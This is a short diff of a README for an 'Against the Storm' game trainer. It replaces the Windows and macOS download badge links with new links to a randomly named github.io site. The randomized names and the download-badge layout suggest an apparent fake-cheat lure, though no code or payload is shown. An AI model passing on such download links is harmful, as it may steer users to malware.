@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/cuwmvwafxucl/against-the-storm-trainer)
 
-[![Get Trainer](https://img.shields.io/badge/⬇️_Get_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://WaterCongressman.github.io/win-download/)
+[![Get Trainer](https://img.shields.io/badge/⬇️_Get_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://iloqhmlhfppl.github.io/win-get2/)
 
 ![Against the Storm](game.jpg)
 
@@ -76,7 +76,7 @@ The **Against the Storm Trainer** solves all these issues, giving you complete c
 
 ## 🍎 macOS
 
-[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
+[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
 
 ## ⚖️ Legal
 
